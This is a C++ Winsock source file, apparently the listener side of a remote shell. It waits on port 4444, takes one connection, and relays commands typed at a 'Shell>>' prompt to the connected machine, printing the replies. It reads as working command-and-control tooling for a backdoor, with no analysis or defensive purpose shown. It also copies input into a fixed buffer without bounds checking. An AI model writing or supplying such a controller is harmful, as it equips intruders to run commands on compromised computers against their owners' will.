#include <iostream>
#include <winsock2.h>
using namespace std;

int PORT = 4444;
#define PACKET_SIZE 1024

int main(){
system("cls");
WSADATA wsa;
WSAStartup(MAKEWORD(2,2), &wsa);

SOCKET skt;
skt = socket(PF_INET,SOCK_STREAM,IPPROTO_TCP);

SOCKADDR_IN addr = {};
addr.sin_family = AF_INET;
addr.sin_port = htons(PORT);
addr.sin_addr.s_addr = htonl(INADDR_ANY);

bind(skt, (SOCKADDR*)&addr,sizeof(addr));
listen(skt,SOMAXCONN);

SOCKADDR_IN client = {};
int client_size = sizeof(client);
ZeroMemory(&client,client_size);
SOCKET client_sock = accept(skt,(SOCKADDR*)&client,&client_size);

string str;
char buf[PACKET_SIZE],rev[10000];
char titleset[100];
sprintf(titleset, "클라이언트접속: %s", inet_ntoa(client.sin_addr));
SetConsoleTitle(titleset);
while(1){
ZeroMemory(buf,PACKET_SIZE);
ZeroMemory(rev,10000);
cout << "Shell>>";
getline(cin,str);
for(int i=0;i<str.size();i++) buf[i] = str[i];
send(client_sock,buf,sizeof(buf),0);
recv(client_sock,rev,10000,0);
cout << rev << endl;
}
closesocket(client_sock);
closesocket(skt);
WSACleanup();
}
